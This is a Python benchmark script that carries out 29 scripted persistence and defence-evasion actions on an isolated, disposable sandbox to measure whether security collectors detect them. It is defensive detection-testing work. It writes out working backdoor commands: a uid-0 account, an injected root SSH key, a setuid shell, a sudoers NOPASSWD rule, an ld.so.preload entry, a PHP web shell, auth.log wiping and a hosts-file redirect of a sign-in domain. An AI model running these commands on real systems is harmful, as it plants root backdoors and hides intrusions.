#!/usr/bin/env python3
"""Live detection measurement: do real attacker actions on a disposable machine,
then ask reviewed observation collectors what they saw.

    sudo -E env JARVIS_ARENA_SANDBOX=1 python3 scripts/security/live_bench.py [--json OUT]
    python3 scripts/security/live_bench.py --list        what would be done; runs nothing

The text replay (atomic_bench.py) measures the rule layer on command lines. It
cannot say whether the collectors that watch *state* (autostart entries, accounts,
keys, units, listeners, hidden processes) catch anything, and it never executes
anything. This does the opposite: a fixed list of local, reversible actions is
carried out for real, an explicit allowlist of Linux observation collectors runs before and after against a
throwaway store, and an action counts as caught when a finding that was not there
before names its unique marker.

Containment is structural (see jarvis/lab/isolation.py). This refuses to do
anything unless ALL of these hold, and says which one failed:
  * the machine is a marked Arena sandbox (JARVIS_ARENA_SANDBOX=1 or the marker file);
  * it is a GitHub-hosted ephemeral runner (GITHUB_ACTIONS=true and
    RUNNER_ENVIRONMENT=github-hosted), or --disposable-vm was passed by a person;
  * no Argus store exists in the invoking account's home (a machine that is
    being protected is never a test target);
  * it runs as root (the actions need it, and so does undoing them);
  * only a loopback network interface is present (the workflow uses unshare --net).
The actions are written here, reviewed, and never downloaded: no network, no
malware, nothing leaves the machine. Every action has an undo, run in a finally.

A measurement, not a gate: the result is printed (and written with --json). It
promotes nothing by itself.
"""
import argparse
import hashlib
import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import time
import uuid

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, ROOT)

from jarvis.lab import isolation  # noqa: E402

# Explicit reviewed observation-only jobs; new scheduler jobs are excluded by default.
READ_ONLY = frozenset({"scan", "implant", "backdoor", "posture", "asep", "hidden", "intrusion", "evasion",
                       "webshell", "content", "sysmon_linux", "auditd", "logins", "sshwatch", "linuxguard"})
CHILD = ("import sys, json; sys.path.insert(0, %r)\n"
         "from jarvis.service.jobs import run_job\n"
         "out = run_job(sys.argv[1], ('wsl',), sys.argv[2])\n"
         "print(json.dumps([{k: str(f.get(k) or '')[:2000] for k in ('category','severity','title','detail','where')}"
         " for f in (out or []) if isinstance(f, dict)]))\n") % ROOT
T = "argus-live-" + uuid.uuid4().hex[:10]  # unique per run, plus scenario number

def stop_process(sid, hidden=False):
    """Kill only the recorded process whose executable still has our unique marker."""
    prefix = f"/tmp/.{T}-{sid}/kworker" if hidden else f"/tmp/{T}-{sid}"
    pidfile = f"/tmp/{T}-{sid}.pid"
    return (f'if [ -r {pidfile} ]; then pid=$(cat {pidfile}); '
            f'case "$(readlink /proc/$pid/exe)" in "{prefix}"*) kill "$pid";; esac; fi; '
            f'rm -f {pidfile}')


# (id, technique, what it is, do, undo, extra strings that identify it in a finding)
# Each `do` is a shell script run as root with `set -e`. Local and reversible only.
SCENARIOS = (
    ("01", "T1053.003", "system cron job running a script from /tmp",
     f"printf '#!/bin/sh\\ntrue\\n' > /tmp/{T}-01.sh; chmod 755 /tmp/{T}-01.sh; "
     f"printf '* * * * * root /tmp/{T}-01.sh\\n' > /etc/cron.d/{T}-01",
     f"rm -f /etc/cron.d/{T}-01 /tmp/{T}-01.sh", ()),
    ("02", "T1136.001", "second account with user id 0",
     f"useradd -o -u 0 -g 0 -M -N -s /bin/sh {T}-02",
     f"userdel -f {T}-02 || sed -i '/^{T}-02:/d' /etc/passwd /etc/shadow", ()),
    ("03", "T1098.004", "SSH key added to root's authorized_keys",
     "mkdir -p /root/.ssh; chmod 700 /root/.ssh; "
     f"printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0wmN/Cr3JXqmLW7u+g9pTh+wyqDHpSQEIQczXkVx9q {T}-03\\n' "
     ">> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys",
     f"sed -i '/{T}-03/d' /root/.ssh/authorized_keys", ()),
    ("04", "T1543.002", "enabled systemd service running a program from /tmp",
     f"cp /bin/sleep /tmp/{T}-04; printf '[Unit]\\nDescription={T}-04\\n[Service]\\nExecStart=/tmp/{T}-04 3600\\n"
     f"[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{T}-04.service; "
     f"systemctl daemon-reload; systemctl enable --now {T}-04.service; systemctl is-active --quiet {T}-04.service",
     f"systemctl disable --now {T}-04.service; rm -f /etc/systemd/system/{T}-04.service /tmp/{T}-04; "
     "systemctl daemon-reload", ()),
    ("05", "T1548.001", "setuid-root copy of a shell in /tmp",
     f"cp /bin/dash /tmp/{T}-05; chown root:root /tmp/{T}-05; chmod 4755 /tmp/{T}-05",
     f"rm -f /tmp/{T}-05", ()),
    ("06", "T1574.006", "library added to /etc/ld.so.preload",
     f"cp \"$(ldconfig -p | awk '/libm.so.6 /{{print $NF; exit}}')\" /usr/local/lib/{T}-06.so; "
     f"cp -a /etc/ld.so.preload /etc/ld.so.preload.{T} 2>/dev/null || true; "
     f"printf '/usr/local/lib/{T}-06.so\\n' >> /etc/ld.so.preload",
     f"if [ -e /etc/ld.so.preload.{T} ]; then mv -f /etc/ld.so.preload.{T} /etc/ld.so.preload; "
     f"else rm -f /etc/ld.so.preload; fi; rm -f /usr/local/lib/{T}-06.so", ()),
    ("07", "T1546.004", "script dropped in /etc/profile.d",
     f"printf 'export ARGUS_LIVE_07=1\\n(/tmp/{T}-07 &) 2>/dev/null\\n' > /etc/profile.d/{T}-07.sh",
     f"rm -f /etc/profile.d/{T}-07.sh", ()),
    ("08", "T1571", "listener on all interfaces on an unusual port",
     f"cp \"$(command -v python3)\" /tmp/{T}-08; "
     f"setsid /tmp/{T}-08 -c 'import socket,time; s=socket.socket(); s.bind((\"0.0.0.0\", 44408)); "
     f"s.listen(1); time.sleep(3600)' >/dev/null 2>&1 & echo $! > /tmp/{T}-08.pid; "
     f"sleep 1; kill -0 \"$(cat /tmp/{T}-08.pid)\"",
     stop_process("08") + f"; rm -f /tmp/{T}-08", ("44408",)),
    ("09", "T1070.004", "process still running after its program file was deleted",
     f"cp /bin/sleep /tmp/{T}-09; setsid /tmp/{T}-09 3600 >/dev/null 2>&1 & "
     f"echo $! > /tmp/{T}-09.pid; sleep 1; kill -0 \"$(cat /tmp/{T}-09.pid)\"; "
     f"rm -f /tmp/{T}-09",
     stop_process("09") + f"; rm -f /tmp/{T}-09", ()),
    ("10", "T1098", "sshd drop-in allowing root password logins",
     f"mkdir -p /etc/ssh/sshd_config.d; printf 'PermitRootLogin yes\\nPasswordAuthentication yes\\n"
     f"PermitEmptyPasswords yes\\n' > /etc/ssh/sshd_config.d/00-{T}-10.conf",
     f"rm -f /etc/ssh/sshd_config.d/00-{T}-10.conf", ("PermitEmptyPasswords", "PermitRootLogin")),
    ("11", "T1548.003", "sudoers drop-in granting passwordless root",
     f"printf 'nobody ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/{T}-11; chmod 440 /etc/sudoers.d/{T}-11",
     f"rm -f /etc/sudoers.d/{T}-11", ()),
    ("12", "T1505.003", "PHP web shell in the web root",
     # Assembled from pieces at run time so that no file in the repository contains a
     # web shell (an antivirus on a build machine would be right to object to one).
     "mkdir -p /var/www/html; printf '%s%s%s%s\\n' '<?php if(isset($_PO' 'ST[\"c\"])){ sys' 'tem($_PO' "
     f"'ST[\"c\"]); }} ?>' > /var/www/html/{T}-12.php",
     f"rm -f /var/www/html/{T}-12.php", ()),
    ("13", "T1053.003", "root crontab entry at reboot",
     f"(crontab -l 2>/dev/null || true; printf '@reboot /dev/shm/.{T}-13\\n') | crontab -; "
     f"crontab -l | grep -Fq '{T}-13'",
     f"crontab -l 2>/dev/null | grep -v '{T}-13' | crontab - || true", ()),
    ("14", "T1564.001", "hidden executable in /tmp, running",
     f"mkdir -p /tmp/.{T}-14; cp /bin/sleep /tmp/.{T}-14/kworker; "
     f"setsid /tmp/.{T}-14/kworker 3600 >/dev/null 2>&1 & "
     f"echo $! > /tmp/{T}-14.pid; sleep 1; kill -0 \"$(cat /tmp/{T}-14.pid)\"",
     stop_process("14", hidden=True) + f"; rm -rf /tmp/.{T}-14", ()),
    ("15", "T1070.003", "root shell history redirected to /dev/null",
     f"cp -a /root/.bash_history /root/.bash_history.{T} 2>/dev/null || true; ln -sf /dev/null /root/.bash_history",
     f"rm -f /root/.bash_history; [ -e /root/.bash_history.{T} ] && mv -f /root/.bash_history.{T} "
     "/root/.bash_history || true", ("bash_history",)),
    ("16", "T1037.004", "rc.local created and made executable",
     f"[ -e /etc/rc.local ] && cp -a /etc/rc.local /etc/rc.local.{T}; "
     f"printf '#!/bin/sh\\n/dev/shm/{T}-16 &\\nexit 0\\n' > /etc/rc.local; chmod 755 /etc/rc.local",
     f"if [ -e /etc/rc.local.{T} ]; then mv -f /etc/rc.local.{T} /etc/rc.local; else rm -f /etc/rc.local; fi",
     ("rc.local",)),
    # Second list (2026-11-11): persistence and defence evasion the first sixteen do not cover.
    ("17", "T1053.006", "enabled systemd timer running a program from /tmp",
     f"cp /bin/true /tmp/{T}-17; printf '[Unit]\\nDescription={T}-17\\n[Service]\\nType=oneshot\\nExecStart=/tmp/{T}-17\\n' "
     f"> /etc/systemd/system/{T}-17.service; printf '[Unit]\\nDescription={T}-17\\n[Timer]\\nOnCalendar=hourly\\n"
     f"[Install]\\nWantedBy=timers.target\\n' > /etc/systemd/system/{T}-17.timer; "
     f"systemctl daemon-reload; systemctl enable --now {T}-17.timer",
     f"systemctl disable --now {T}-17.timer || true; rm -f /etc/systemd/system/{T}-17.timer "
     f"/etc/systemd/system/{T}-17.service /tmp/{T}-17; systemctl daemon-reload", ()),
    ("18", "T1556.003", "PAM module line added to the shared sign-in stack",
     f"printf '#!/bin/sh\\nexit 0\\n' > /tmp/{T}-18.sh; chmod 755 /tmp/{T}-18.sh; "
     f"cp -a /etc/pam.d/common-auth /etc/pam.d/common-auth.{T}; "
     f"printf 'auth optional pam_exec.so quiet /tmp/{T}-18.sh\\n' >> /etc/pam.d/common-auth",
     f"if [ -e /etc/pam.d/common-auth.{T} ]; then mv -f /etc/pam.d/common-auth.{T} /etc/pam.d/common-auth; fi; "
     f"rm -f /tmp/{T}-18.sh", ("pam_exec", "common-auth")),
    ("19", "T1548.001", "file capability cap_setuid on a copy of an interpreter",
     f"cp \"$(readlink -f \"$(command -v python3)\")\" /tmp/{T}-19; setcap cap_setuid+ep /tmp/{T}-19; "
     f"getcap /tmp/{T}-19 | grep -q cap_setuid",
     f"rm -f /tmp/{T}-19", ("cap_setuid",)),
    ("20", "T1546", "udev rule that runs a program",
     f"printf '#!/bin/sh\\nexit 0\\n' > /tmp/{T}-20.sh; chmod 755 /tmp/{T}-20.sh; "
     f"printf 'ACTION==\"add\", SUBSYSTEM==\"net\", RUN+=\"/tmp/{T}-20.sh\"\\n' > /etc/udev/rules.d/99-{T}-20.rules",
     f"rm -f /etc/udev/rules.d/99-{T}-20.rules /tmp/{T}-20.sh", ()),
    ("21", "T1546.004", "line appended to the system-wide bash startup file",
     f"cp -a /etc/bash.bashrc /etc/bash.bashrc.{T}; printf '(/tmp/{T}-21 >/dev/null 2>&1 &)\\n' >> /etc/bash.bashrc",
     f"if [ -e /etc/bash.bashrc.{T} ]; then mv -f /etc/bash.bashrc.{T} /etc/bash.bashrc; fi", ("bash.bashrc",)),
    ("22", "T1574.006", "LD_PRELOAD set for every session in /etc/environment",
     f"cp -a /etc/environment /etc/environment.{T} 2>/dev/null || touch /etc/environment.{T}; "
     f"printf 'LD_PRELOAD=/usr/local/lib/{T}-22.so\\n' >> /etc/environment",
     f"if [ -e /etc/environment.{T} ]; then mv -f /etc/environment.{T} /etc/environment; fi", ("LD_PRELOAD",)),
    ("23", "T1037", "executable script added to the login message directory",
     f"mkdir -p /etc/update-motd.d; printf '#!/bin/sh\\n/tmp/{T}-23 &\\n' > /etc/update-motd.d/99-{T}-23; "
     f"chmod 755 /etc/update-motd.d/99-{T}-23",
     f"rm -f /etc/update-motd.d/99-{T}-23", ("update-motd",)),
    ("24", "T1098", "new account added to the sudo group",
     f"useradd -M -N -s /bin/bash -G sudo {T}-24",
     f"userdel -f {T}-24 || true", ()),
    ("25", "T1070.002", "authentication log emptied",
     f"[ -e /var/log/auth.log ] || touch /var/log/auth.log; cp -a /var/log/auth.log /var/log/auth.log.{T}; "
     f"printf 'Nov 11 00:00:00 host sshd[1]: argus-live seed line\\n' >> /var/log/auth.log; sync; : > /var/log/auth.log",
     f"if [ -e /var/log/auth.log.{T} ]; then mv -f /var/log/auth.log.{T} /var/log/auth.log; fi", ("auth.log",)),
    ("26", "T1546", "APT hook that runs a program before every package update",
     f"printf '#!/bin/sh\\nexit 0\\n' > /tmp/{T}-26.sh; chmod 755 /tmp/{T}-26.sh; "
     f"printf 'APT::Update::Pre-Invoke {{\"/tmp/{T}-26.sh\";}};\\n' > /etc/apt/apt.conf.d/99{T}-26",
     f"rm -f /etc/apt/apt.conf.d/99{T}-26 /tmp/{T}-26.sh", ("Pre-Invoke",)),
    ("27", "T1547.013", "desktop autostart entry for every user",
     f"mkdir -p /etc/xdg/autostart; printf '[Desktop Entry]\\nType=Application\\nName={T}-27\\nExec=/tmp/{T}-27\\n' "
     f"> /etc/xdg/autostart/{T}-27.desktop",
     f"rm -f /etc/xdg/autostart/{T}-27.desktop", ()),
    ("28", "T1036.005", "program named sshd running from a temporary folder",
     f"mkdir -p /var/tmp/{T}-28; cp /bin/sleep /var/tmp/{T}-28/sshd; "
     f"setsid /var/tmp/{T}-28/sshd 3600 >/dev/null 2>&1 & echo $! > /tmp/{T}-28.pid; sleep 1; "
     f"kill -0 \"$(cat /tmp/{T}-28.pid)\"",
     f"if [ -r /tmp/{T}-28.pid ]; then pid=$(cat /tmp/{T}-28.pid); "
     f"case \"$(readlink /proc/$pid/exe)\" in /var/tmp/{T}-28/*) kill \"$pid\";; esac; fi; "
     f"rm -f /tmp/{T}-28.pid; rm -rf /var/tmp/{T}-28", ()),
    ("29", "T1565.001", "hosts file redirecting a sign-in domain",
     f"cp -a /etc/hosts /etc/hosts.{T}; printf '203.0.113.7 login.microsoftonline.com # {T}-29\\n' >> /etc/hosts",
     f"if [ -e /etc/hosts.{T} ]; then mv -f /etc/hosts.{T} /etc/hosts; fi", ("microsoftonline",)),
)


def network_isolated():
    """Enumerate interfaces in this process's network namespace, not the sysfs mount."""
    try:
        return {name for _index, name in socket.if_nameindex()} <= {"lo"}
    except OSError:
        return False


def refusal(env=None, uid=None, home=None, disposable_vm=False, isolated_network=None):
    """Why nothing may be executed here, or '' when every condition holds."""
    env = os.environ if env is None else env
    uid = os.getuid() if uid is None else uid
    home = os.path.expanduser("~") if home is None else home
    if not isolation.is_sandbox():
        return isolation.why_not_sandbox()
    hosted = env.get("GITHUB_ACTIONS") == "true" and env.get("RUNNER_ENVIRONMENT") == "github-hosted"
    if not hosted and not disposable_vm:
        return ("this is not a GitHub-hosted ephemeral runner, and --disposable-vm was not given. "
                "The actions change system files; they run only on a machine that will be thrown away.")
    real_home = env.get("SUDO_USER") and os.path.expanduser("~" + env["SUDO_USER"]) or home
    for candidate in {home, real_home, "/root"}:
        for store in (".jarvis/jarvis.db", ".argus/argus.db"):
            if os.path.exists(os.path.join(candidate, store)):
                return f"an Argus store exists at {os.path.join(candidate, store)}: a protected machine is never a test target"
    for install in ("/var/lib/argus", "/var/lib/jarvis", "/opt/jarvis/current"):
        if os.path.exists(install):
            return "Argus is installed on this machine: a protected machine is never a test target"
    if uid != 0:
        return "run as root: the actions and their undo need it"
    if isolated_network is None:
        isolated_network = network_isolated()
    if not isolated_network:
        return "network is not isolated: run inside a network namespace with only loopback"
    return ""


def sh(script, timeout=60):
    # Kill the whole action process group on timeout, including its shell children.
    process = subprocess.Popen(["/bin/sh", "-c", "set -e; " + script], stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, text=True, start_new_session=True)
    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except BaseException:
        try:
            os.killpg(process.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        process.communicate()
        raise
    return subprocess.CompletedProcess(process.args, process.returncode, stdout, stderr)


def run_job(name, db, home, timeout):
    env = {"HOME": home, "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
           "LANG": "C.UTF-8", "JARVIS_NO_ALERTS": "1"}
    try:
        r = subprocess.run([sys.executable, "-I", "-c", CHILD, name, db], env=env, cwd=home,
                           capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None, "timeout"
    if r.returncode:
        return None, (r.stderr or "")[-200:].strip().replace("\n", " ")
    try:
        return json.loads(r.stdout.strip().splitlines()[-1]), ""
    except (ValueError, IndexError):
        return None, "unreadable output"


def key(job, f):
    return job + "|" + hashlib.sha256(json.dumps(f, sort_keys=True).encode()).hexdigest()


def attribute(scenarios, new_findings):
    """{scenario id: [(job, severity, title)]}: new findings that name a scenario's marker."""
    out = {s[0]: [] for s in scenarios}
    for job, f in new_findings:
        text = " ".join(f.values())
        for sid, _tid, _what, _do, _undo, extra in scenarios:
            if f"{T}-{sid}" in text or any(e in text for e in extra):
                out[sid].append((job, f["severity"], f["title"][:120]))
    return out


def job_names():
    from jarvis.core import mechanisms
    from jarvis.platform import facts as hostfacts
    from jarvis.service import schedule
    keep, _absent = schedule.applicable(False, True, server=True, facts=hostfacts.current())
    return [(n, mechanisms.BY_NAME[n].timeout) for n in keep if n in READ_ONLY and n in mechanisms.BY_NAME]


def sweep(names, db, home):
    findings, failed = {}, {}
    for name, timeout in names:
        got, error = run_job(name, db, home, timeout=max(60.0, timeout * 2))
        if got is None:
            failed[name] = error
            continue
        for f in got:
            if f.get("severity") not in ("", "ok"):
                findings[key(name, f)] = (name, f)
    return findings, failed


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--list", action="store_true", help="print the actions and exit; nothing runs")
    ap.add_argument("--disposable-vm", action="store_true",
                    help="a person states this is a throwaway VM (still needs the sandbox mark)")
    ap.add_argument("--json")
    args = ap.parse_args(argv)
    if args.list:
        for sid, tid, what, _do, _undo, _extra in SCENARIOS:
            print(f"{sid}  {tid:<10} {what}")
        return 0
    why = refusal(disposable_vm=args.disposable_vm)
    if why:
        print(f"refused, nothing was executed: {why}", file=sys.stderr)
        return 2
    names = job_names()
    applied, attempted, cleanup_failed = [], [], {}
    not_applied = {s[0]: "not attempted" for s in SCENARIOS}
    after, failed_after, execution_error = {}, {}, ""
    def interrupted(signum, frame):
        raise InterruptedError("benchmark interrupted")
    signal.signal(signal.SIGTERM, interrupted)
    started = time.time()
    with tempfile.TemporaryDirectory(prefix="argus-live-") as home:
        os.makedirs(os.path.join(home, ".jarvis"), mode=0o700)
        db = os.path.join(home, ".jarvis", "jarvis.db")
        before, failed_before = sweep(names, db, home)
        try:
            for s in SCENARIOS:
                attempted.append(s)
                try:
                    r = sh(s[3])
                except subprocess.TimeoutExpired:
                    not_applied[s[0]] = "action timed out; cleanup attempted"
                    continue
                if r.returncode == 0:
                    applied.append(s)
                    not_applied.pop(s[0], None)
                else:
                    not_applied[s[0]] = (r.stderr or r.stdout)[-160:].strip().replace("\n", " ")
            after, failed_after = sweep(names, db, home)
        except (Exception, KeyboardInterrupt) as exc:
            execution_error = type(exc).__name__
        finally:
            for s in reversed(attempted):
                try:
                    result = sh(s[4])
                    if result.returncode:
                        cleanup_failed[s[0]] = "undo returned failure"
                except Exception as exc:           # an undo must not stop the others
                    cleanup_failed[s[0]] = type(exc).__name__
            if cleanup_failed:
                print("CLEANUP FAILED: " + ", ".join(sorted(cleanup_failed)), file=sys.stderr)
    new = [v for k, v in after.items() if k not in before]
    caught = attribute(applied, new)
    rows = []
    for sid, tid, what, _do, _undo, _extra in SCENARIOS:
        state = "not applied" if sid in not_applied else ("caught" if caught.get(sid) else "missed")
        rows.append({"id": sid, "technique": tid, "what": what, "state": state,
                     "why": not_applied.get(sid, ""), "findings": caught.get(sid, []),
                     "high_or_critical": any(sev in ("high", "critical") for _job, sev, _title in caught.get(sid, []))})
    n_applied = len(applied)
    n_caught = sum(1 for r in rows if r["state"] == "caught")
    report = {"applied": n_applied, "caught": n_caught,
              "high_or_critical": sum(row["high_or_critical"] for row in rows), "scenarios": rows,
              "jobs_run": len(names), "jobs": [name for name, _timeout in names], "jobs_failed_before": failed_before, "jobs_failed_after": failed_after,
              "cleanup_failed": cleanup_failed, "execution_error": execution_error, "new_findings": len(new), "seconds": round(time.time() - started, 1)}
    print(f"live detection: {n_caught} of {n_applied} applied actions were named by a new finding "
          f"({len(SCENARIOS) - n_applied} could not be applied here); {len(names)} collectors, "
          f"{len(failed_after)} failed; {report['seconds']} s")
    for r in rows:
        mark = {"caught": "CAUGHT", "missed": "MISSED", "not applied": "n/a   "}[r["state"]]
        by = "; ".join(f"{j}: [{sev}] {title}" for j, sev, title in r["findings"][:2]) or r["why"]
        print(f"  {mark} {r['id']} {r['technique']:<10} {r['what']}" + (f"  <- {by}" if by else ""))
    if failed_after:
        print("  collectors that failed (their view is missing, not clean): "
              + ", ".join(f"{n} ({e[:60]})" for n, e in sorted(failed_after.items())))
    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=1)
    return 1 if execution_error or cleanup_failed or failed_before or failed_after or not_applied else 0


if __name__ == "__main__":
    sys.exit(main())
